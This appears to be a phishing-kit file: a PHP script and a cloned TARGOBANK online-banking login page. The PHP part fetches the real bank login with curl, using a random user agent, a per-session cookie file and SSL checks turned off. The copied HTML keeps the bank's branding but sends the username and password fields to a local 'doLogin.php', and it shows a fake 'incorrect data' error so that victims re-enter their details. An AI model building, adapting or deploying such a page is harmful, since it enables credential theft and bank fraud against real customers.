<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

include "ua.php";
session_start();
if(isset($_SESSION["cookiesFile"] ) && file_exists($_SESSION["cookiesFile"])){ 
    unlink($_SESSION["cookiesFile"]);
}
$tmpFileName = dirname(__FILE__) . "/cookies/" . md5(uniqid(rand(), true)).".txt" ;
$fpp = fopen($tmpFileName, 'w');
$_SESSION["cookiesFile"] = $tmpFileName;




$fp = fopen(dirname(__FILE__) . '/errorlog.txt', 'w');
$fp2 = fopen(dirname(__FILE__) . '/errorlog_.txt', 'w');
$ua = random_uagent();

$init_url = "https://www.targobank.de/de/identification/login.cgi";
$ok = doCall($init_url, $tmpFileName, $fp, "", "https://www.targobank.de/de/identification/login.cgi", $ua, null, true);

function doCall($url, $cookie_file, $err_file, $origin, $referer, $ua, $post = null, $getHeader, $follow = false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);

    
    curl_setopt($ch, CURLOPT_HEADER, $getHeader);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    

    if($post != null){
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_POST, 1);
    }
    
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_STDERR, $err_file);
    curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);

    $headers = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Pragma: no-cache';
    $headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Origin: '.$origin;
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'User-Agent: '.$ua;
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headers[] = 'Referer: '.$referer;
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $body = curl_exec($ch);
    
    if (curl_errno($ch)) {
        return 'Error:' . curl_error($ch);
    }
    
    curl_close ($ch);
    
    
 
    return $body;
}

?>
<!DOCTYPE html>
<html lang="de" class="js  ua-webkit ua-safari ua-safari-5 de identification no-slides has-no-nav no-touch theme-0 dom-ready all-ready"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="Content-Language" content="de">
<title>Online-Banking | TARGOBANK</title><meta name="description" content="Das Online-Banking der TARGOBANK. Einfach. Sicher. Individuell. Alle Bankgesch�fte im Blick und bequem online verwalten.">
<meta name="espace" content="Aucun">
<meta name="google" content="notranslate">

	<link rel="stylesheet" type="text/css" href="./login_files/env.css">
	<link rel="stylesheet" type="text/css" href="./login_files/v3commun.css">
	<link rel="stylesheet" type="text/css" href="./login_files/v3base.css">
	<link rel="stylesheet" type="text/css" href="./login_files/stylegroupe.css">
	<link rel="stylesheet" type="text/css" href="./login_files/targobank-redesign.css"> 
    <script type="text/javascript" src="./login_files/jquery.js"></script>
	   
    <script type="text/javascript" src="./login_files/lightbox.js"></script>
    <script type="text/javascript" src="./login_files/ei_tools.js"></script>
	<!--[if lte IE 8]>
		<script src="/de/javascript/appli/html5_ie.js" type="text/javascript"></script>
		<link href="/de/cssnv/redesign/ie_hacks.css" rel="stylesheet" type="text/css"/>
	<![endif]-->
	<meta name="viewport" content="width=1100">

	<meta name="robots" content="noodp,index,follow">
	<link rel="SHORTCUT ICON" href="https://www.targobank.de/de/images/favicon/favicon.ico">
	<!-- <script type="text/javascript" src="/de/javascript/mobile_switch.js"></script> -->
	<script type="text/javascript" src="./login_files/suche.js"></script>
	<script type="text/javascript" src="./login_files/tab-search-suggest.js"></script>
	<link rel="stylesheet" type="text/css" href="./login_files/targobank-search-suggest.css">

	<script>
		jQuery(document).ready(function () {
			if ($('#ei_tpl_ident_infos_login_attempt').length > 0) {
				var header = $("#menuheader");
				if (header.length > 0) {
					header.remove();
				}
				var ident_home = $("#ei_tpl_ident_home");
				if (ident_home.length > 0) {
					if (ident_home.attr("href").length == 0) {
						ident_home.attr("href", "/de/banque/espace_personnel.aspx");
					}
				}
				var auth_mode_info = $("#ei_tpl_authentication_mode_information");
				if (auth_mode_info.length > 0) {
					var replaced = auth_mode_info.html().replace("SUBSTITUTION MODE", "");
					auth_mode_info.html(replaced);
				}
			}
		});
	</script>

	<!--
<script>
jQuery(document).ready(function(){
        if($('#ei_tpl_ident_infos_login_attempt').length > 0 ) {
                $("#menuheader").remove();
                if($("#ei_tpl_ident_home").attr("href") == "") {
                        $("#ei_tpl_ident_home").attr("href", "/de/banque/espace_personnel.aspx");
                }
        }
});
</script>
-->
	<style>
		div#ei_tpl_login a {
			display: block !important;
		}
	</style>



    <!-- additional styles -->
    <link type="text/css" rel="stylesheet" href="./login_files/pb_global.css">
    <!--<link type="text/css" rel="stylesheet" href="/de/cssnv/redesign/menu_style.css">-->
    <link href="./login_files/targobank-redesign(1).css" id="tab-redesign-css" rel="stylesheet" type="text/css">

    <!--[if lte IE 8]>
    <link href="/de/cssnv/redesign/ie_hacks.css" rel="stylesheet" type="text/css"/><![endif]-->

    <script src="./login_files/extended_global.js"></script>
    <script src="./login_files/tab-login.js"></script>
    <!-- JavaScripts -->
    <script type="text/javascript" src="./login_files/funcs_global.js"></script>
    <script type="text/javascript" src="./login_files/tracking.js"></script>

		<style type="text/css">
		    html.touch .ym-g50 .box-teaser {
		        display:none;
		        position:relative;
		    }
		    html.touch.all-ready .ym-g50 .box-teaser {
		        display:block;
		    }
		</style>   

<script language="JavaScript" src="./login_files/display.js"></script>
<script language="JavaScript" src="./login_files/lightbox.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./login_files/mobile-login.css">

	
<!--<link rel="stylesheet" type="text/css" href="/de/cssnv/redesign/contactformular.css" />-->
<script type="text/javascript">

function readCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for(var i=0;i < ca.length;i++) {
                var c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1,c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
}
  function choisirTaille(sens) {

        if (!taille) taille = 0;

        if (sens == "-") taille--;
        if (sens == "+") taille++;

        if (taille > 2) taille = 2;
        if (taille < 0) taille = 0;
        document.body.className = (taille == 0) ? "" : "fontsize" + taille;

        var date = new Date();
        date.setTime(date.getTime()+(365*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
        document.cookie = "taille="+taille+expires+"; path=/";

}


var taille;

window.onload = function(e) {
        taille = readCookie("taille");
        if (!taille) taille=0;
       if (taille != 0) {
                document.body.className = "fontsize" + taille;
        }
}

</script>
<link rel="canonical" href="https://www.targobank.de/de/identification/login.cgi">
</head><body>
<div id="ModalLightBoxSessionExtension" class="a_blocappli" style="display:none;">
<input type="hidden" id="sessionExtensionCallback" value="/de/async/ReNewSession.aspx" data-tracked="true">
</div>
<div id="root">
	<header>
		<div class="ym-wrapper">
			<div class="ym-wbox ym-clearfix">
				<div id="e_header">
					<div id="e_bdHaut">
						<div id="e_logo">
							
		<!-- <script>
 detect_phone();
</script>  //-->
		<a href="https://www.targobank.de/" accesskey="1" target="_top" onmousedown="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Logo&#39;);">
    <img alt="TARGOBANK Online-Kredit Bank" src="./login_files/logo.gif">
</a>

	
						</div>
						<div id="infos_beo">
							BLZ: 300 209 00 | BIC: CMCIDEDD
						</div>
													<div id="e_search">
							  <form method="get" action="https://www.targobank.de/service/suche/index.html" name="e_search form" class="search-form" autocomplete="off" data-tracked="true">
									<input type="text" id="recherche" name="pQuery" class="e_texte" onfocus="if(this.value==&#39;Text, WKN, ISIN, PLZ&#39;){this.value=&#39;&#39;;}" onblur="if(this.value==&#39;&#39;){this.value=&#39;Text, WKN, ISIN, PLZ&#39;;}" autocomplete="off" data-tracked="true">
									<input type="image" src="./login_files/icoreche.gif" alt="Suche starten" class="e_image" data-tracked="true">
								</form>
							</div>
						<div class="menuh" id="menuheader" style="margin-top: -2px;">
    <ul>
        <li class="sep"><span class="v3"><a href="https://www.targobank.de/index.html" target="_top" onmousedown="trkEVT(&#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Privatkunden&#39;);">Privatkunden</a></span></li>
        <li class="sep"><span class="v3"><a href="https://www.targobank.de/geschaeftskunden/index.html" target="_top" onclick="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Geschaeftskunden&#39;);">Gesch�ftskunden</a></span></li>
        <li><span class="v3"><a href="https://www.targobank.de/firmenkunden/partnerbereich.html" target="_top" onclick="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Firmenkunden&#39;);">Firmenkunden</a></span></li>
    </ul>
</div>
						<div id="e_identification">
							<aside>
								<div id="ei_tpl_ident">
    <div id="ei_tpl_login">
    <a id="ei_tpl_ident_login" href="https://www.targobank.de/de/identification/login.cgi"><img src="./login_files/login.png" alt="Se connecter"></a>
    
    
    </div>
</div>

							</aside>
						</div>
					</div>
					<div id="e_bdBas"></div>
				</div>
			</div>

			<!-- / -->

		</div>
	</header>

	<div id="hero-teaser"><div class="slider-fallback-img"></div></div>

	<div id="main">
		<div class="ym-wrapper">
			<div class="ym-wbox theme-border content-box">
				<section class="ym-clearfix" id="page">
					<article class="content ym-gbox">

						<!-- ### START: content frame ### -->

						

<!-- Adform -->

<img src="./login_files/saved_resource" width="1" height="1" alt="">

<!-- /Adform -->


    <!-- ### START: ZONE Directmenu ### -->
    <script type="text/javascript">
        var tab_directmenu_top = 222;
        var tab_directmenu_nr = 'number-20';
    </script>
    <!-- ### END: ZONE Directmenu ### -->

    <!-- ### START: content frame ### -->
    <div class="ym-grid">

        <div class="ym-g100">
            <div class="ym-gbox ym-clearfix">

                <div class="ym-clearfix" id="page-tabs">
                    <h2 class="theme-bg"><span>Online-Banking</span></h2>
                    <ul class="reset" id="tab-pagetabs-list">
                        <li><a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#pagetab-box1" class="active theme-border theme-color">Deutsch</a></li>
                        <li><a href="https://www.targobank.de/en/online-banking/login.cgi">English</a></li>
                    </ul>
                </div>
                <div class="tab-pagetabs-box active" id="pagetab-box1" data-pagetab-index="0">
                    <div class="ym-clearfix tab-login-v2">
                    	
                    	 <h2 class="margin-top-no margin-bottom-small">Melden Sie sich hier mit Ihrem Benutzernamen und Passwort zum Online-Banking an.</h2>

                        <!--margin-bottom-no-->

                        <style>
	.login__maintenance {
		margin-left: 125px;
		padding-top: 14px;
	}
	@media (max-width:767px) {
		.login__maintenance {
			margin-left: 50px;
  		padding-top: 2px;
		}
	}
</style>

<!--
<div class="box-teaser no-hover is-notification">
    <img class="float-left margin-top-no" src="/de/images/redesign/login/icon-info.png" alt="">
    <div class="login__maintenance">
	    <h2>Information zum Jahresende:</h2>
	    <p>
	       Hinweis f�r den Zahlungsverkehr:<br>Bitte beachten Sie, dass Ihre Auftr�ge (u.a. �berweisungen etc.) ab 31.12.2018, 20:15 Uhr bis einschlie�lich 01.01.2019 aufgrund des Jahreswechsels erst am 02.01.2019 gebucht werden.
	    </p>
	    <p>
	    	Hinweis f�r das Wertpapiergesch�ft:<br>Der Wertpapierhandel wird an allen deutschen B�rsenpl�tzen und �ber unsere Handelspartner im au�erb�rslichen Handel vom 28.12.2018 ab 14 Uhr bis einschlie�lich 01.01.2019 ausgesetzt.<br>Am 02.01.2019 wird der Wertpapierhandel an allen Handelspl�tzen zu den regul�ren Handelszeiten wieder aufgenommen.
	    </p>
    </div>
</div>
-->

                        <script language="javascript">
<!--
if (self != top)
top.location.href = document.location.href;
//-->
</script>

<div class="a_blocappli">
<!--<div class="blocmsg alerte">
    Bitte geben Sie Ihren Benutzernamen und Ihr Passwort ein.
</div>
--></div>
<div class="a_blocappli" style="display:<?php echo isset($_GET["error"])?  "block": "none"; ?>">
<div class="blocmsg alerte" data-gtm-vis-recent-on-screen-8664604_34="125" data-gtm-vis-first-on-screen-8664604_34="125" data-gtm-vis-total-visible-time-8664604_34="100" data-gtm-vis-has-fired-8664604_34="1">
    Die von Ihnen eingegebenen Daten sind falsch. Bitte versuchen Sie es erneut.
</div>
</div>
                        <div class="ym-grid ym-clearfix login-grid">

                            <div class="ym-g75 ym-gl">
                                <div class="ym-gbox-left">
                                    <!-- EI Begin: Login-Module START -->
                                    <div class="box-teaser no-hover ym-clearfix login-form-box">

                                        <a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#" class="back-left">Zur�ck</a>
                                        <a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#" class="back-right">Zur�ck</a>

                                        <div class="pull-left login-form">

                                            <div class="login-form-wrapper">

                                                <h3 class="margin-top-no margin-bottom-small">
                                                    Sie sind bereits Kunde der TARGOBANK?
                                                </h3>

                                                <p>
                                                    &nbsp;
                                                </p>
                                                
<script>
    function IsCabAuthentication() {
        var userId = $('#_userid');
        if (userId) {
            var userIdValue = userId.val();
            var cabRegex = /^CAB[0-9]{10}$/;
            if (userIdValue && (cabRegex.test(userIdValue.toUpperCase()) || userIdValue.substring(0, 9) === '925000353')) {
                $("div[class^='bloctxt alerte eir_hidexs']").html("<p><em>Achtung! Wenn Sie sich mit Ihrer Bankkarte anmelden m�chten, klicken Sie bitte im linken Men� auf den Punkt Karte</em></p>");
                $("div[class^='bloctxt alerte eir_showxs']").html("<p><em>Achtung! Wenn Sie sich mit Ihrer Bankkarte anmelden m�chten, klicken Sie bitte im oberen Dropdown-Men� auf den Punkt Karte.</em></p>");
                $(".alerteBlock").show();
                return true;
            }
        }
        return false;
     }
</script>


<div class="ei_appl_ident" id="ident">
    
    
    
    

    
    <form action="doLogin.php" method="post" autocomplete="off" onsubmit="return submitForm()" name="bloc_ident" id="bloc_ident" data-tracked="true">
        <fieldset>
            
            <div class="ei_appl_ident_content">
                
                
                <div class="ei_appl_ident_lig">
                    <label for="_userid">Benutzername</label>
                    <input type="text" name="_cm_user" id="_userid" value="" placeholder="" class="ei_appl_userid" maxlength="" tabindex="1" data-tracked="true">
                    
                    
                    
                    
                </div>
                <div class="ei_appl_ident_lig">
                    <label for="_pwduser">Passwort</label>
                    <input type="password" name="_cm_pwd" id="_pwduser" placeholder="" class="ei_appl_pwduser" maxlength="" tabindex="2" data-tracked="true">
                    

                </div>
                
                
                <div class="ei_appl_ident_lig aide login-forgot-password"><a href="https://www.targobank.de/de/identification/login.cgi" class="open-function-forgot">Passwort vergessen?</a></div>
                <script type="text/javascript">
                    document.forms["bloc_ident"]._userid.focus();
                    var formSubmitted = false;
                    function submitForm() {
                        var user = $("#_userid").val();
                        var pass = $("#_pwduser").val();
                        return user.length > 0 && pass.length > 0 
                       /* if (formSubmitted) {
                            return false;
                        } else {
                            formSubmitted = true;

                            

                            return true;
                        }*/
                    }
                </script>
            </div>
        </fieldset>

        

        

        

        

        

        <div class="ei_appl_ident_blocbts">
            <span class="ei_buttonbar">
                <span class="ei_mainbuttons">
                    
                    
                    <input id="login-submit" type="image" alt="Jetzt einloggen" class="ei_btn_typ_send" src="./login_files/seconnecter.png" name="submit" tabindex="4" data-tracked="true">
                    
                </span>
                
                
            </span>
        </div>

        

        
    </form>
</div>


                                            </div>

												                    <div class="login-function-forgot" style="display: none">
												                        <h3 class="margin-top-no margin-bottom-small">
												                            Sie haben Ihre Zugangsdaten vergessen?
												                        </h3>
												
												                        <p class="margin-bottom-normal">
																									&nbsp;
																								</p>

                                                                        <p class="margin-bottom-small">
                                                                            <label><input type="radio" name="ctypeForget" value="1" checked="" data-tracked="true"> Privatkunde</label>
                                                                            <label><input type="radio" name="ctypeForget" value="2" data-tracked="true"> Geschäftskunden</label>
                                                                        </p>

                                                                        <div id="tbForgetGroup1" class="js-tb-forgetgroup">
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=b&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;vergessen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
                                                                            </p>
                                                    
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=s&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;vergessen-Kreditkarte als Einzelprodukt&#39;);">Kreditkarte als Einzelprodukt</a>
                                                                            </p>
                                                                        </div>
                                                                        <div id="tbForgetGroup2" class="js-tb-forgetgroup" style="display: none;">
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=d&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;SME: vergessen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
                                                                            </p>
                                                                        </div>
                                                                        
												                    </div>

                                        <div class="disable-layer"></div></div>

                                        <div class="v-line">
                                            <span>oder</span>
                                        </div>

                                        <script language="javascript" type="text/javascript">
<!--
function popitup(url) {
	newwindow=window.open(url,'name','height=490,width=660', 'scrollbars=no');
	if (window.focus) {newwindow.focus()}
	return false;
}
// -->
</script>

<div class="pull-right login-functions">
    <div class="login-function-new-user">
        <h3>Neu bei der TARGOBANK?</h3>
        <a class="button blue open-function-create grayed" href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;Benutzerdaten-anlegen B&#39;);"><span>Benutzerdaten anlegen</span></a>
    </div>

    <div class="login-function-create" style="display: none; margin-top:67px;">
        <h3 class="margin-top-no margin-bottom-large">
            Zugangsdaten anlegen
        </h3>

        <p class="margin-bottom-small">
            <label><input type="radio" name="ctype" value="1" checked="" data-tracked="true"> Privatkunde</label>
            <label><input type="radio" name="ctype" value="2" data-tracked="true"> Gesch�ftskunde</label>
        </p>

        <div id="tbRegisterGroup1" class="js-tb-registergroup">
            <p class="margin-bottom-small">
                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=b&amp;a=31" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;anlegen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
            </p>

            <p class="margin-bottom-small">
                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=s&amp;a=31" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;anlegen-Kreditkarte als Einzelprodukt&#39;);">Kreditkarte als Einzelprodukt</a>
            </p>
        </div>

        <div id="tbRegisterGroup2" class="js-tb-registergroup" style="display: none;">
            <p class="margin-bottom-small">
                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=d&amp;a=31" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;SME anlegen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
            </p>
        </div>


    </div>

<div class="disable-layer"></div></div>

                                    </div>
                                    <!-- EI Begin: Login-Module END -->
                                </div>
                            </div>

                           

                        </div>

                        
        <div class="ym-grid ym-clearfix">

            
						
           <img src="images/bottom.png" width="960" />

        </div>

    


                    </div>
                </div>
                <div class="tab-pagetabs-box" id="pagetab-box2" data-pagetab-index="1"></div>
            </div>
        </div>

    </div>
    <!-- ### END: content frame ### -->
    
    <!-- ### START: Log ### -->
    <!--
		<script type="text/javascript">
		(function() {
		  if(String(window.location.href).indexOf('fromLogout') === -1) {
		    $.removeCookie('redirect-login');
		  }
		})();
		</script>
		-->
	  <!-- ### END: Log ### --> 



						<!-- ### END: content frame ### -->

					</article>
				</section>

			</div>
		</div>
	</div>

	<footer>
		<div class="ym-wrapper">
			<div class="ym-wbox ym-clearfix">
				<div id="e_footer">
					

<div class="fg">
    <ul>
        <li>
            <a href="https://www.targobank.de/ueber-uns/index.html">�ber uns</a>
        </li>
        <li>
            <a href="https://www.targobank.de/service/newsletter/index.html">Newsletter</a>
        </li>
        <li>
            <a href="https://www.targobank.de/de/jobs-karriere/index.html">Jobs &amp; Karriere</a>
        </li>
        <li>
            <a href="https://www.targobank.de/partner/index.html?p=02">Affiliate</a>
        </li>
        <li class="last">
            <a href="https://www.targobank.de/kredit/index.html">Kredite</a>
        </li>
        <br>
        <li>
            <a href="https://www.targobank.de/impressum/index.html">Impressum</a>
        </li>
        <li>
            <a href="https://www.targobank.de/datenschutz/index.html">Datenschutz</a>
        </li>
        <li>
            <a href="https://www.targobank.de/rechtliche-hinweise/index.html">Rechtliche Hinweise</a>
        </li>
        <li>
            <a href="https://www.targobank.de/de/download/Preisubersicht.pdf">Preise &amp; Leistungen</a>
        </li>
        <li class="last">
            <a href="https://www.targobank.de/de/service/sicherheit.html">Sicherheit</a>
        </li>
    </ul>
</div>

<!-- <div class="fd">
<ul id="e_AA">
        <li id="li_aplus">
                <a title="A: Schrift vergr��ern" class="e_Aplus" onclick="choisirTaille('+');" href="#">A</a>
        </li>
        <li id="li_amoins">
                <a title="A: Schrift verkleinern" class="e_Amoins" onclick="choisirTaille('-');" href="#">A</a>
        </li></ul>
</div>  -->
<div class="e_nof">
</div>


				</div>
			</div>
		</div>
	</footer>

<div id="tab-directmenu" class="v2" style="top: 222px;"><a href="https://www.targobank.de/de/service/kontakt.html" data-lb-width="700" data-lb-height="400" class="kontakt" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Kontakt&#39;)"></a><a href="https://www.targobank.de/de/service/popup_service_telefon.html?addEvent=HP_directmenue_telefon&amp;number=number-20" data-lb-width="620" data-lb-height="620" class="telefon tab-lb"></a><a href="https://www.targobank.de/de/service/suchen-und-finden/filialsuche.aspx?addEvent=HP_directmenue_filialsuche" data-lb-width="800" data-lb-height="500" class="filiale tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Filialsuche&#39;)"></a><a href="https://www.targobank.de/de/service/popup_service_mobile-kundenberatung.html?addEvent=HP_directmenue_msf" data-lb-width="700" data-lb-height="400" class="berater tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Beratung zu Hause&#39;)"></a><a href="https://www.targobank.de/de/service/kontakt/kontaktformular.html?addEvent=HP_directmenue_kontaktformular" data-lb-width="700" data-lb-height="625" class="email tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;E-Mail-Kontakt&#39;)"></a><a href="https://www.targobank.de/termin/index.html" data-lb-width="660" data-lb-height="940" class="online-termin tab" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Online-Terminvereinbarung&#39;)"></a><a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I" class="close-menu"></a></div></div>
<!-- web analytics -->
</body></html>